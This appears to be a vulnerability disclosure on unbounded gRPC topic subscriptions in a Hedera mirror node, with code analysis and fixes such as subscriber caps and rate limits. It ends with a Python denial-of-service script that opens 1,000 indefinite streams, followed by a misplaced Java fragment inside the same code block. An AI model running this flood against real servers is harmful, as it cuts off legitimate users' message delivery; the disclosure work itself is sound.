### Title
Unbounded `subscribeTopic()` Subscriptions Enable DB Connection Pool Exhaustion DoS

### Summary
`ConsensusController.subscribeTopic()` accepts an unlimited number of concurrent streaming subscriptions from any unauthenticated caller. The only server-side guard — `maxConcurrentCallsPerConnection = 5` — is scoped per TCP connection, not globally, so an attacker opening many connections bypasses it entirely. Each accepted subscription independently polls the database, and with no global subscriber cap, an attacker can exhaust the R2DBC connection pool and starve legitimate subscribers of message delivery.

### Finding Description

**Exact code path:**

`ConsensusController.subscribeTopic()` (lines 43–53) immediately creates a reactive pipeline and subscribes it with no admission check:

```java
public void subscribeTopic(ConsensusTopicQuery request, StreamObserver<ConsensusTopicResponse> responseObserver) {
    final var disposable = Mono.fromCallable(() -> toFilter(request))
            .flatMapMany(topicMessageService::subscribeTopic)   // no guard before this
            ...
            .subscribe(responseObserver::onNext, ...);
```

`TopicMessageServiceImpl.subscribeTopic()` (lines 48, 59–91) maintains `subscriberCount` only as a Micrometer gauge metric — it is **never checked against a maximum** before accepting a new subscriber:

```java
private final AtomicLong subscriberCount = new AtomicLong(0L);
// ...
.doOnSubscribe(s -> subscriberCount.incrementAndGet())   // metric only
.doFinally(s -> subscriberCount.decrementAndGet())       // metric only
```

Every accepted subscription immediately triggers:
1. `entityRepository.findById()` — a synchronous-style DB lookup for topic existence.
2. `topicMessageRetriever.retrieve(filter, true)` → `PollingTopicMessageRetriever.poll()` → `topicMessageRepository.findByFilter()` — repeated DB queries on a polling loop.

**Why the existing check is insufficient:**

`GrpcConfiguration` (lines 28–35) configures:
```java
serverBuilder.maxConcurrentCallsPerConnection(nettyProperties.getMaxConcurrentCallsPerConnection());
// default: 5
```
This is a **per-TCP-connection** limit. There is no limit on the number of TCP connections an attacker may open, no IP-based connection rate limit, and no global cap on total active gRPC streams or subscribers anywhere in the codebase.

### Impact Explanation
An attacker flooding the server with subscriptions across many TCP connections (N connections × 5 streams = N×5 active subscriptions) causes each subscription to issue concurrent DB queries. The R2DBC connection pool for the gRPC service has no explicitly configured maximum visible in the codebase, meaning the pool is exhausted or heavily contended. Legitimate subscribers experience query timeouts (`retriever.timeout = 60s` default) or backpressure buffer overflow errors (`maxBufferSize = 16384`), resulting in dropped or severely delayed HCS topic message delivery. For applications using HCS topics to coordinate fund-critical operations (e.g., payment confirmations, threshold signatures), this constitutes a targeted availability attack.

### Likelihood Explanation
No authentication or API key is required to call `subscribeTopic()`. The gRPC port (5600) is publicly exposed. An attacker needs only a standard gRPC client and the ability to open many TCP connections — trivially achievable from a single machine or botnet. The attack is repeatable and persistent as long as the attacker holds connections open (indefinite subscriptions with no `endTime` and no `limit`). The `maxConcurrentCallsPerConnection = 5` default provides negligible friction.

### Recommendation
1. **Enforce a global subscriber cap**: Check `subscriberCount` against a configurable maximum in `TopicMessageServiceImpl.subscribeTopic()` before accepting a new subscription; return `RESOURCE_EXHAUSTED` status if exceeded.
2. **Add per-IP connection rate limiting**: Use a gRPC `ServerInterceptor` to track and limit concurrent streams per remote address.
3. **Add per-topic subscriber cap**: Reject subscriptions when a single topic already has N active subscribers from the same source.
4. **Require `endTime` or `limit`**: Reject or time-out indefinite subscriptions after a configurable maximum duration to prevent connection holding.
5. **Configure R2DBC pool bounds explicitly** and add a circuit breaker so pool exhaustion returns a fast error rather than queuing indefinitely.

### Proof of Concept
```python
import grpc
import threading
from hedera.mirror.api.proto import consensus_service_pb2_grpc
from hedera.mirror.api.proto import consensus_service_pb2
from hederahashgraph.api.proto.java import basic_types_pb2

TARGET = "mirror-node-grpc:5600"
TOPIC_NUM = 1234   # any valid topic
NUM_CONNECTIONS = 200
STREAMS_PER_CONN = 5  # matches maxConcurrentCallsPerConnection default

def flood(conn_id):
    channel = grpc.insecure_channel(TARGET)
    stub = consensus_service_pb2_grpc.ConsensusServiceStub(channel)
    query = consensus_service_pb2.ConsensusTopicQuery(
        topicID=basic_types_pb2.TopicID(topicNum=TOPIC_NUM),
        # no limit, no endTime → indefinite subscription
    )
    streams = []
    for _ in range(STREAMS_PER_CONN):
        # Each call opens a long-lived streaming RPC
        streams.append(stub.subscribeTopic(query))
    # Hold all streams open
    for s in streams:
        for _ in s:
            pass

threads = [threading.Thread(target=flood, args=(i,)) for i in range(NUM_CONNECTIONS)]
for t in threads: t.start()
# Result: 1000 concurrent subscriptions, each polling DB independently
# → R2DBC pool exhausted → legitimate subscribers receive DEADLINE_EXCEEDED or buffer overflow errors

    private Flux<TopicMessage> poll(PollingContext context) {
        TopicMessageFilter filter = context.getFilter();
        TopicMessage last = context.getLast();
        int limit = filter.hasLimit()
                ? (int) (filter.getLimit() - context.getTotal().get())
                : Integer.MAX_VALUE;
        int pageSize = Math.min(limit, context.getMaxPageSize());
        var startTime = last != null ? last.getConsensusTimestamp() + 1 : filter.getStartTime();
        context.getPageSize().set(0L);

        var newFilter = filter.toBuilder().limit(pageSize).startTime(startTime).build();

        log.debug("Executing query: {}", newFilter);
        return Flux.fromStream(topicMessageRepository.findByFilter(newFilter));
